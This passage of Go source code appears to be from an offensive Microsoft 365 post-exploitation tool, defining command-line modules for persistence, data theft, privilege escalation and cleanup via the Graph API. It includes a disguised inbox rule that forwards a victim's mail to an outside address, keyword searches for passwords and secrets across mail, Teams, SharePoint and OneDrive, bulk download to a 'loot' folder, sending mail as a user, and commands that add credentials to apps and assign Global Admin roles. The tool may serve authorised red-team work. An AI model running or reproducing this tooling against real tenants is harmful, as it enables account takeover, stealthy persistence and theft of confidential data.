	cmd.MarkFlagRequired("app-id")
	return cmd
}

func persistMailRuleCmd() *cobra.Command {
	var userID, ruleName, forwardTo, keywords string
	cmd := &cobra.Command{
		Use:   "mail-rule",
		Short: "Create an inbox forwarding rule (persistence via email exfiltration)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Persist: Create Mail Rule")
			kw := strings.Split(keywords, ",")
			result, err := persist.CreateMailRule(context.Background(), client, userID, ruleName, forwardTo, kw)
			if err != nil {
				return err
			}
			printAndSave("persist-mail-rule", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user-id", "", "Target user ID or UPN")
	cmd.Flags().StringVar(&ruleName, "rule-name", "System Update Notification", "Display name for the rule")
	cmd.Flags().StringVar(&forwardTo, "forward-to", "", "Email address to forward matching emails to")
	cmd.Flags().StringVar(&keywords, "keywords", "", "Comma-separated subject keywords to match (empty = all emails)")
	cmd.MarkFlagRequired("user-id")
	cmd.MarkFlagRequired("forward-to")
	return cmd
}

func persistListMailRulesCmd() *cobra.Command {
	var userID string
	cmd := &cobra.Command{
		Use:   "list-mail-rules",
		Short: "List inbox rules for a user (detect existing persistence)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Recon: List Mail Rules")
			result, err := persist.ListMailRules(context.Background(), client, userID)
			if err != nil {
				return err
			}
			printAndSave("recon-mail-rules", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user-id", "", "Target user ID or UPN")
	cmd.MarkFlagRequired("user-id")
	return cmd
}

// ============================= PILLAGE =============================

func pillageCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "pillage",
		Short: "Data exfiltration and search modules",
	}
	cmd.AddCommand(
		pillageMailboxCmd(),
		pillageSharePointCmd(),
		pillageTeamsCmd(),
		pillageUserAttrsCmd(),
		pillageInboxCmd(),
		pillageChatsCmd(),
		pillageDownloadCmd(),
		pillageSPSearchCmd(),
		pillageSPDownloadCmd(),
		pillageSPFilesCmd(),
		pillageKQLSearchCmd(),
		pillageNotebooksCmd(),
		pillageCalendarCmd(),
		pillageOneDriveCmd(),
		pillageSendMailCmd(),
		pillagePlannerCmd(),
		pillageContactsCmd(),
	)
	return cmd
}

func pillageMailboxCmd() *cobra.Command {
	var keywords string
	var limit int
	var userID string
	cmd := &cobra.Command{
		Use:   "mailbox",
		Short: "Search mailbox content by keywords",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Mailbox Search")
			kw := strings.Split(keywords, ",")
			result, err := pillage.SearchMailbox(context.Background(), client, kw, userID, limit)
			if err != nil {
				return err
			}
			printAndSave("pillage-mailbox", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&keywords, "keywords", "password,secret,credential,key", "Comma-separated search keywords")
	cmd.Flags().IntVar(&limit, "limit", 50, "Max results per keyword")
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID (default: current user)")
	return cmd
}

func pillageSharePointCmd() *cobra.Command {
	var keywords string
	var limit int
	var downloadDir string
	cmd := &cobra.Command{
		Use:   "sharepoint",
		Short: "Search and download SharePoint/OneDrive files",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: SharePoint/OneDrive Search")
			kw := strings.Split(keywords, ",")
			result, err := pillage.SearchSharePoint(context.Background(), client, kw, limit, downloadDir)
			if err != nil {
				return err
			}
			printAndSave("pillage-sharepoint", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&keywords, "keywords", "password,credentials,secret", "Comma-separated search keywords")
	cmd.Flags().IntVar(&limit, "limit", 50, "Max results")
	cmd.Flags().StringVar(&downloadDir, "download-dir", "", "Download matching files to this directory")
	return cmd
}

func pillageTeamsCmd() *cobra.Command {
	var keywords string
	var limit int
	cmd := &cobra.Command{
		Use:   "teams",
		Short: "Search Teams messages by keywords",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Teams Search")
			kw := strings.Split(keywords, ",")
			result, err := pillage.SearchTeams(context.Background(), client, kw, limit)
			if err != nil {
				return err
			}
			printAndSave("pillage-teams", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&keywords, "keywords", "password,secret,credential", "Comma-separated keywords")
	cmd.Flags().IntVar(&limit, "limit", 50, "Max results")
	return cmd
}

func pillageUserAttrsCmd() *cobra.Command {
	var keywords string
	cmd := &cobra.Command{
		Use:   "user-attrs",
		Short: "Search user directory attributes for sensitive data",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: User Attribute Search")
			kw := strings.Split(keywords, ",")
			result, err := pillage.SearchUserAttributes(context.Background(), client, kw)
			if err != nil {
				return err
			}
			printAndSave("pillage-user-attrs", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&keywords, "keywords", "password,pass,secret,key,token,cred", "Comma-separated keywords")
	return cmd
}

func pillageInboxCmd() *cobra.Command {
	var userID string
	var top int
	cmd := &cobra.Command{
		Use:   "inbox",
		Short: "Read inbox messages for a user",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Inbox Reader")
			result, err := pillage.ReadInbox(context.Background(), client, userID, top)
			if err != nil {
				return err
			}
			printAndSave("pillage-inbox", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID or UPN (default: current user)")
	cmd.Flags().IntVar(&top, "top", 25, "Number of messages to retrieve")
	return cmd
}

func pillageChatsCmd() *cobra.Command {
	var limit int
	cmd := &cobra.Command{
		Use:   "chats",
		Short: "Download Teams chat conversations",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Teams Chats")
			result, err := pillage.ReadChats(context.Background(), client, limit)
			if err != nil {
				return err
			}
			printAndSave("pillage-chats", result)
			return nil
		},
	}
	cmd.Flags().IntVar(&limit, "limit", 20, "Max chats to retrieve")
	return cmd
}

func pillageDownloadCmd() *cobra.Command {
	var driveID, itemID, outPath string
	cmd := &cobra.Command{
		Use:   "download",
		Short: "Download a file from a drive by ID",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: File Download")
			err = pillage.DownloadFile(context.Background(), client, driveID, itemID, outPath)
			if err != nil {
				return err
			}
			output.Success("Downloaded to %s", outPath)
			return nil
		},
	}
	cmd.Flags().StringVar(&driveID, "drive-id", "", "Drive ID")
	cmd.Flags().StringVar(&itemID, "item-id", "", "Item ID")
	cmd.Flags().StringVar(&outPath, "output", "downloaded_file", "Output file path")
	cmd.MarkFlagRequired("drive-id")
	cmd.MarkFlagRequired("item-id")
	return cmd
}

func authWatchCmd() *cobra.Command {
	var sessionName string
	var interval int
	cmd := &cobra.Command{
		Use:   "watch",
		Short: "Keep a session's token alive with background auto-refresh (runs until Ctrl+C)",
		RunE: func(cmd *cobra.Command, args []string) error {
			ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
			defer cancel()

			if sessionName == "" {
				sess, err := app.Store.GetActive()
				if err != nil {
					return err
				}
				sessionName = sess.Name
			}

			output.Header("Auth Watch: " + sessionName)
			output.Info("Monitoring session %q (check interval: %ds). Press Ctrl+C to stop.", sessionName, interval)

			ar := &auth.AutoRefresher{
				Auth:     app.Authenticator,
				Session:  sessionName,
				Interval: time.Duration(interval) * time.Second,
			}
			ar.Start()
			defer ar.Stop()

			ticker := time.NewTicker(time.Duration(interval) * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					output.Info("Watch stopped.")
					return nil
				case <-ticker.C:
					sess, err := app.Store.Get(sessionName)
					if err != nil {
						output.Warn("Session error: %v", err)
						continue
					}
					status := output.StyleSuccess.Render("valid")
					if sess.IsExpired() {
						status = output.StyleError.Render("EXPIRED")
					}
					output.Info("[%s] %q — %s, expires: %s",
						time.Now().Format("15:04:05"), sessionName, status,
						sess.ExpiresAt.Format(time.RFC3339))
				}
			}
		},
	}
	cmd.Flags().StringVar(&sessionName, "name", "", "Session to watch (default: active)")
	cmd.Flags().IntVar(&interval, "interval", 300, "Check/refresh interval in seconds")
	return cmd
}

func pillageSPSearchCmd() *cobra.Command {
	var query, entityTypesStr string
	var limit int
	cmd := &cobra.Command{
		Use:   "sp-search",
		Short: "Search SharePoint/OneDrive via Graph Search API with configurable entity types",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: SP Search")
			var entityTypes []string
			if entityTypesStr != "" {
				for _, t := range strings.Split(entityTypesStr, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						entityTypes = append(entityTypes, t)
					}
				}
			}
			result, err := pillage.SearchSP(context.Background(), client, query, entityTypes, limit)
			if err != nil {
				return err
			}
			printAndSave("pillage-sp-search", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&query, "query", "", "Search query string (required)")
	cmd.Flags().StringVar(&entityTypesStr, "types", "driveItem,listItem", "Comma-separated entity types (driveItem,listItem,drive,site,list)")
	cmd.Flags().IntVar(&limit, "limit", 50, "Max results")
	cmd.MarkFlagRequired("query")
	return cmd
}

func pillageSPDownloadCmd() *cobra.Command {
	var query, downloadDir string
	var limit int
	cmd := &cobra.Command{
		Use:   "sp-download",
		Short: "Search SharePoint/OneDrive and bulk-download all matching driveItems",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: SP Bulk Download")
			result, err := pillage.BulkDownload(context.Background(), client, query, limit, downloadDir)
			if err != nil {
				return err
			}
			printAndSave("pillage-sp-download", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&query, "query", "", "Search query string (required)")
	cmd.Flags().StringVar(&downloadDir, "output-dir", "sp-downloads", "Directory to save downloaded files")
	cmd.Flags().IntVar(&limit, "limit", 50, "Max files to download")
	cmd.MarkFlagRequired("query")
	return cmd
}

func pillageKQLSearchCmd() *cobra.Command {
	var query, entityTypesStr, downloadDir, extensions, siteID string
	var limit, from int
	var downloadItems string
	cmd := &cobra.Command{
		Use:   "kql-search",
		Short: "KQL search across SharePoint/OneDrive — returns driveID+itemID for download",
		Long: `Search SharePoint and OneDrive using KQL (Keyword Query Language).
Returns structured results with drive/item IDs ready for individual download.

KQL examples:
  "password filetype:xlsx"
  "confidential AND (filetype:docx OR filetype:pdf)"
  "author:admin@contoso.com created>2024-01-01"
  "path:\"https://contoso.sharepoint.com/sites/hr\" filetype:pptx"
  "*.config OR *.env OR *.key"

Download examples:
  --download 3              Download result #3
  --download 1,3,6          Download results #1, #3, #6
  --download all             Download all results
  --download-dir ./loot     Download all results to ./loot`,
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: KQL Search")
			opts := pillage.KQLSearchOpts{
				Query:  query,
				Limit:  limit,
				From:   from,
				SiteID: siteID,
			}
			if entityTypesStr != "" {
				for _, t := range strings.Split(entityTypesStr, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						opts.EntityTypes = append(opts.EntityTypes, t)
					}
				}
			}
			if extensions != "" {
				for _, ext := range strings.Split(extensions, ",") {
					ext = strings.TrimSpace(ext)
					if ext != "" {
						opts.Extensions = append(opts.Extensions, ext)
					}
				}
			}
			result, err := pillage.KQLSearch(context.Background(), client, opts)
			if err != nil {
				return err
			}

			// Handle --download flag: download specific results by number
			if downloadItems != "" && result.TotalHits > 0 {
				outDir := downloadDir
				if outDir == "" {
					outDir = "."
				}
				if err := os.MkdirAll(outDir, 0700); err != nil {
					return fmt.Errorf("create download dir: %w", err)
				}

				// Parse which items to download
				var indices []int
				if strings.ToLower(downloadItems) == "all" {
					for i := range result.Hits {
						indices = append(indices, i)
					}
				} else {
					for _, s := range strings.Split(downloadItems, ",") {
						s = strings.TrimSpace(s)
						if s == "" {
							continue
						}
						var n int
						if _, err := fmt.Sscanf(s, "%d", &n); err == nil && n >= 1 && n <= len(result.Hits) {
							indices = append(indices, n-1)
						} else {
							output.Warn("Invalid result number: %s (valid: 1-%d)", s, len(result.Hits))
						}
					}
				}

				fmt.Println()
				for _, idx := range indices {
					hit := result.Hits[idx]
					if hit.DriveID == "" || hit.ItemID == "" {
						output.Warn("#%d %s — no drive/item ID (folder?)", idx+1, hit.Name)
						continue
					}
					outPath := fmt.Sprintf("%s/%s", outDir, hit.Name)
					output.Info("Downloading #%d: %s ...", idx+1, hit.Name)
					endpoint := fmt.Sprintf("/drives/%s/items/%s/content", hit.DriveID, hit.ItemID)
					data, dlErr := client.Download(context.Background(), endpoint)
					if dlErr != nil {
						output.Error("Failed: %s — %v", hit.Name, dlErr)
						continue
					}
					if err := os.WriteFile(outPath, data, 0600); err != nil {
						output.Error("Write failed: %v", err)
						continue
					}
					output.Success("Downloaded: %s (%s)", outPath, hit.SizeHuman)
				}
			}

			// Save JSON to file
			if saved := output.AutoSave("pillage-kql-search", result); saved != "" {
				output.Success("Saved → %s", saved)
			}
			if outputCSV != "" {
				if err := output.WriteCSV(outputCSV, result); err == nil {
					output.Success("CSV → %s", outputCSV)
				}
			}
			return nil
		},
	}
	cmd.Flags().StringVar(&query, "query", "", "KQL query string (required)")
	cmd.Flags().StringVar(&entityTypesStr, "types", "driveItem", "Comma-separated entity types (driveItem,listItem,site,drive,list,message)")
	cmd.Flags().IntVar(&limit, "limit", 25, "Max results per page")
	cmd.Flags().IntVar(&from, "from", 0, "Pagination offset (use with --limit to paginate)")
	cmd.Flags().StringVar(&siteID, "site-id", "", "Scope search to a specific SharePoint site ID")
	cmd.Flags().StringVar(&downloadItems, "download", "", "Download results by number: 3, 1,3,6, or all")
	cmd.Flags().StringVar(&downloadDir, "download-dir", "", "Download all matching driveItems to this directory")
	cmd.Flags().StringVar(&extensions, "extensions", "", "Comma-separated extensions to filter results (e.g. docx,xlsx,pdf)")
	cmd.MarkFlagRequired("query")
	return cmd
}

func pillageContactsCmd() *cobra.Command {
	var userID string
	cmd := &cobra.Command{
		Use:   "contacts",
		Short: "Enumerate Outlook contacts for a user (useful for social engineering)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Contacts")
			result, err := pillage.ReadContacts(context.Background(), client, userID)
			if err != nil {
				return err
			}
			printAndSave("pillage-contacts", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID or UPN (default: current user)")
	return cmd
}

func pillageOneDriveCmd() *cobra.Command {
	var userID, downloadDir, extensions string
	var maxDepth int
	cmd := &cobra.Command{
		Use:   "onedrive",
		Short: "Recursive OneDrive file listing + optional download with extension filter",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: OneDrive")
			opts := pillage.OneDriveOpts{
				UserID:      userID,
				MaxDepth:    maxDepth,
				DownloadDir: downloadDir,
			}
			if extensions != "" {
				for _, ext := range strings.Split(extensions, ",") {
					ext = strings.TrimSpace(ext)
					if ext != "" {
						opts.Extensions = append(opts.Extensions, ext)
					}
				}
			}
			result, err := pillage.ListOneDrive(context.Background(), client, opts)
			if err != nil {
				return err
			}
			printAndSave("pillage-onedrive", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID or UPN (default: current user)")
	cmd.Flags().IntVar(&maxDepth, "depth", 10, "Max folder recursion depth")
	cmd.Flags().StringVar(&downloadDir, "download-dir", "", "Download files to this directory")
	cmd.Flags().StringVar(&extensions, "extensions", "", "Comma-separated extensions to filter (e.g. docx,xlsx,pdf,pptx)")
	return cmd
}

func pillageSPFilesCmd() *cobra.Command {
	var siteID, driveID, downloadDir, extensions string
	var maxDepth int
	cmd := &cobra.Command{
		Use:   "sp-files",
		Short: "List and download files from SharePoint drives directly (no Search API dependency)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: SharePoint Files")
			opts := pillage.SPFilesOpts{
				SiteID:      siteID,
				DriveID:     driveID,
				MaxDepth:    maxDepth,
				DownloadDir: downloadDir,
			}
			if extensions != "" {
				for _, ext := range strings.Split(extensions, ",") {
					ext = strings.TrimSpace(ext)
					if ext != "" {
						opts.Extensions = append(opts.Extensions, ext)
					}
				}
			}
			result, err := pillage.ListSPFiles(context.Background(), client, opts)
			if err != nil {
				return err
			}
			printAndSave("pillage-sp-files", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&siteID, "site-id", "", "SharePoint site ID (use 'recon sharepoint-deep' to discover)")
	cmd.Flags().StringVar(&driveID, "drive-id", "", "Specific drive ID (if empty, lists all drives for the site)")
	cmd.Flags().IntVar(&maxDepth, "depth", 10, "Max folder recursion depth")
	cmd.Flags().StringVar(&downloadDir, "download-dir", "", "Download files to this directory")
	cmd.Flags().StringVar(&extensions, "extensions", "", "Comma-separated extensions to filter (e.g. docx,xlsx,pdf,pptx)")
	return cmd
}

func pillageSendMailCmd() *cobra.Command {
	var userID, subject, body, toList string
	var isHTML bool
	cmd := &cobra.Command{
		Use:   "send-mail",
		Short: "Send mail as a user (requires Mail.Send permission)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Send Mail")
			var recipients []string
			for _, r := range strings.Split(toList, ",") {
				r = strings.TrimSpace(r)
				if r != "" {
					recipients = append(recipients, r)
				}
			}
			result, err := pillage.SendMail(context.Background(), client, userID, subject, body, recipients, isHTML)
			if err != nil {
				return err
			}
			printAndSave("pillage-send-mail", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Send as this user ID/UPN (default: current user)")
	cmd.Flags().StringVar(&subject, "subject", "", "Email subject")
	cmd.Flags().StringVar(&body, "body", "", "Email body content")
	cmd.Flags().StringVar(&toList, "to", "", "Comma-separated recipient email addresses")
	cmd.Flags().BoolVar(&isHTML, "html", false, "Send body as HTML")
	cmd.MarkFlagRequired("subject")
	cmd.MarkFlagRequired("body")
	cmd.MarkFlagRequired("to")
	return cmd
}

func pillagePlannerCmd() *cobra.Command {
	var groupID string
	cmd := &cobra.Command{
		Use:   "planner",
		Short: "Enumerate Planner plans and tasks",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Planner/Tasks")
			result, err := pillage.ReadPlanner(context.Background(), client, groupID)
			if err != nil {
				return err
			}
			printAndSave("pillage-planner", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&groupID, "group-id", "", "Group ID to list plans for (default: current user's plans)")
	return cmd
}

// ============================= CLEANUP =============================

func cleanupCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "cleanup",
		Short: "Remove artifacts created during operations",
	}
	cmd.AddCommand(
		cleanupDeleteAppCmd(),
		cleanupDeleteGroupCmd(),
		cleanupRemoveMemberCmd(),
		cleanupRemoveSecretCmd(),
		cleanupRemoveKeyCredCmd(),
		cleanupRemoveMailRuleCmd(),
	)
	return cmd
}

func cleanupDeleteAppCmd() *cobra.Command {
	var appID string
	cmd := &cobra.Command{
		Use:   "delete-app",
		Short: "Delete an application registration",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			err = cleanup.DeleteApp(context.Background(), client, appID)
			if err != nil {
				return err
			}
			output.Success("Deleted application %s", appID)
			return nil
		},
	}
	cmd.Flags().StringVar(&appID, "app-id", "", "Application object ID")
	cmd.MarkFlagRequired("app-id")
	return cmd
}

func cleanupDeleteGroupCmd() *cobra.Command {
	var groupID string
	cmd := &cobra.Command{
		Use:   "delete-group",
		Short: "Delete a group",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			err = cleanup.DeleteGroup(context.Background(), client, groupID)
			if err != nil {
				return err
			}
			output.Success("Deleted group %s", groupID)
			return nil
		},
	}
	cmd.Flags().StringVar(&groupID, "group-id", "", "Group object ID")
	cmd.MarkFlagRequired("group-id")
	return cmd
}

func cleanupRemoveMemberCmd() *cobra.Command {
	var groupID, memberID string
	cmd := &cobra.Command{
		Use:   "remove-member",
		Short: "Remove a member from a group",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			err = cleanup.RemoveMember(context.Background(), client, groupID, memberID)
			if err != nil {
				return err
			}
			output.Success("Removed %s from group %s", memberID, groupID)
			return nil
		},
	}
	cmd.Flags().StringVar(&groupID, "group-id", "", "Group ID")
	cmd.Flags().StringVar(&memberID, "member-id", "", "Member object ID to remove")
	cmd.MarkFlagRequired("group-id")
	cmd.MarkFlagRequired("member-id")
	return cmd
}

func cleanupRemoveSecretCmd() *cobra.Command {
	var appObjectID, spObjectID, keyID string
	cmd := &cobra.Command{
		Use:   "remove-secret",
		Short: "Remove a password credential from an app or service principal",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			if appObjectID != "" {
				return cleanup.RemoveAppSecret(context.Background(), client, appObjectID, keyID)
			}
			if spObjectID != "" {
				return cleanup.RemoveSPSecret(context.Background(), client, spObjectID, keyID)
			}
			return fmt.Errorf("provide --app-id or --sp-id")
		},
	}
	cmd.Flags().StringVar(&appObjectID, "app-id", "", "Application object ID")
	cmd.Flags().StringVar(&spObjectID, "sp-id", "", "Service principal object ID")
	cmd.Flags().StringVar(&keyID, "key-id", "", "Credential key ID to remove")
	cmd.MarkFlagRequired("key-id")
	return cmd
}

func cleanupRemoveKeyCredCmd() *cobra.Command {
	var appObjectID, keyID string
	cmd := &cobra.Command{
		Use:   "remove-key-cred",
		Short: "Remove a certificate credential from an app registration",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			return cleanup.RemoveAppKeyCred(context.Background(), client, appObjectID, keyID)
		},
	}
	cmd.Flags().StringVar(&appObjectID, "app-id", "", "Application object ID")
	cmd.Flags().StringVar(&keyID, "key-id", "", "Key credential ID to remove")
	cmd.MarkFlagRequired("app-id")
	cmd.MarkFlagRequired("key-id")
	return cmd
}

func cleanupRemoveMailRuleCmd() *cobra.Command {
	var userID, ruleID string
	cmd := &cobra.Command{
		Use:   "remove-mail-rule",
		Short: "Delete an inbox rule from a user's mailbox",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			return cleanup.RemoveMailRule(context.Background(), client, userID, ruleID)
		},
	}
	cmd.Flags().StringVar(&userID, "user-id", "", "Target user ID or UPN")
	cmd.Flags().StringVar(&ruleID, "rule-id", "", "Mail rule ID to delete")
	cmd.MarkFlagRequired("user-id")
	cmd.MarkFlagRequired("rule-id")
	return cmd
}

// ============================= PILLAGE (notebooks / calendar) =============================

func pillageNotebooksCmd() *cobra.Command {
	var userID, keywords string
	cmd := &cobra.Command{
		Use:   "notebooks",
		Short: "Enumerate OneNote notebooks, sections, and pages (optionally filter by keywords)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: OneNote Notebooks")
			var kw []string
			if keywords != "" {
				for _, k := range strings.Split(keywords, ",") {
					k = strings.TrimSpace(k)
					if k != "" {
						kw = append(kw, k)
					}
				}
			}
			result, err := pillage.ReadNotebooks(context.Background(), client, userID, kw)
			if err != nil {
				return err
			}
			printAndSave("pillage-notebooks", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID or UPN (default: current user)")
	cmd.Flags().StringVar(&keywords, "keywords", "", "Comma-separated keywords to filter page content (fetches page HTML if set)")
	return cmd
}

func pillageCalendarCmd() *cobra.Command {
	var userID string
	var top int
	cmd := &cobra.Command{
		Use:   "calendar",
		Short: "Extract calendar events and meeting links (Teams, Zoom, Webex) including passwords",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Pillage: Calendar")
			result, err := pillage.ReadCalendar(context.Background(), client, userID, top)
			if err != nil {
				return err
			}
			printAndSave("pillage-calendar", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&userID, "user", "", "Target user ID or UPN (default: current user)")
	cmd.Flags().IntVar(&top, "top", 50, "Number of events to retrieve")
	return cmd
}

// ============================= ESCALATE =============================

func escalateCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "escalate",
		Short: "Privilege escalation modules",
	}
	cmd.AddCommand(
		escalateAddAppCredsCmd(),
		escalateAddSPSecretCmd(),
		escalateAssignRoleCmd(),
		escalateGrantAppPermCmd(),
		escalateAdminConsentCmd(),
		escalateResetPasswordCmd(),
		escalateAddOwnerCmd(),
		escalateListRolesCmd(),
	)
	return cmd
}

func escalateAddAppCredsCmd() *cobra.Command {
	var appObjectID, appName, hint string
	var expireDays int
	cmd := &cobra.Command{
		Use:   "add-app-creds",
		Short: "Add a client secret to an existing app registration (by object ID or display name)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Add App Credentials")

			// Resolve by name if object ID not given
			if appObjectID == "" && appName != "" {
				oid, appID, name, err := persist.FindAppByDisplayName(context.Background(), client, appName)
				if err != nil {
					return err
				}
				output.Info("Found app: %s (appId: %s, objectId: %s)", name, appID, oid)
				appObjectID = oid
			}
			if appObjectID == "" {
				return fmt.Errorf("provide --app-id (object ID) or --app-name")
			}

			result, err := persist.AddAppCredentials(context.Background(), client, appObjectID, hint, expireDays)
			if err != nil {
				return err
			}
			printAndSave("escalate-add-app-creds", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&appObjectID, "app-id", "", "Application object ID")
	cmd.Flags().StringVar(&appName, "app-name", "", "Application display name (alternative to --app-id)")
	cmd.Flags().StringVar(&hint, "hint", "graphrunner", "Display name for the new credential")
	cmd.Flags().IntVar(&expireDays, "expire-days", 365, "Credential validity in days")
	return cmd
}

func escalateAddSPSecretCmd() *cobra.Command {
	var spObjectID, displayName string
	var validDays int
	cmd := &cobra.Command{
		Use:   "add-sp-secret",
		Short: "Add a password secret to a service principal (direct SP-level credential injection)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Add SP Secret")
			result, err := escalate.AddSPSecret(context.Background(), client, spObjectID, displayName, validDays)
			if err != nil {
				return err
			}
			printAndSave("escalate-add-sp-secret", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&spObjectID, "sp-id", "", "Service principal object ID")
	cmd.Flags().StringVar(&displayName, "name", "graphrunner", "Display name for the credential")
	cmd.Flags().IntVar(&validDays, "valid-days", 365, "Credential validity in days")
	cmd.MarkFlagRequired("sp-id")
	return cmd
}

func escalateAssignRoleCmd() *cobra.Command {
	var roleID, principalID string
	cmd := &cobra.Command{
		Use:   "assign-role",
		Short: "Assign a directory role to a user or service principal",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Assign Directory Role")
			result, err := escalate.AssignRole(context.Background(), client, roleID, principalID)
			if err != nil {
				return err
			}
			printAndSave("escalate-assign-role", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&roleID, "role-id", "", "Role definition ID (e.g. 62e90394... for Global Admin)")
	cmd.Flags().StringVar(&principalID, "principal-id", "", "User or SP object ID to assign the role to")
	cmd.MarkFlagRequired("role-id")
	cmd.MarkFlagRequired("principal-id")
	return cmd
}

func escalateListRolesCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list-roles",
		Short: "List all directory role definitions (for use with assign-role)",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: List Role Definitions")
			roles, err := escalate.ListRoleDefinitions(context.Background(), client)
			if err != nil {
				return err
			}
			printAndSave("escalate-list-roles", roles)
			return nil
		},
	}
}

func escalateGrantAppPermCmd() *cobra.Command {
	var targetSPID, appRoleID, resourceSPID string
	var autoGraph bool
	cmd := &cobra.Command{
		Use:   "grant-app-perm",
		Short: "Grant an application permission (appRoleAssignment) to a service principal",
		RunE: func(cmd *cobra.Command, args []string) error {
			client, err := app.GraphClient()
			if err != nil {
				return err
			}
			output.Header("Escalate: Grant App Permission")

			if autoGraph && resourceSPID == "" {
				output.Info("Resolving Microsoft Graph service principal...")
				spID, err := escalate.FindGraphSPID(context.Background(), client)
				if err != nil {
					return fmt.Errorf("find Graph SP: %w", err)
				}
				resourceSPID = spID
				output.Success("Graph SP: %s", spID)
			}
			if resourceSPID == "" {
				return fmt.Errorf("provide --resource-sp-id or use --auto-graph")
			}

			result, err := escalate.GrantAppPermission(context.Background(), client, targetSPID, resourceSPID, appRoleID)
			if err != nil {
				return err
			}
			printAndSave("escalate-grant-app-perm", result)
			return nil
		},
	}
	cmd.Flags().StringVar(&targetSPID, "sp-id", "", "Target service principal ID to grant permissions to")
	cmd.Flags().StringVar(&appRoleID, "role-id", "", "App role ID (e.g. e2a3a72e... for Mail.ReadWrite)")
	cmd.Flags().StringVar(&resourceSPID, "resource-sp-id", "", "Resource SP ID (e.g. Microsoft Graph SP in tenant)")
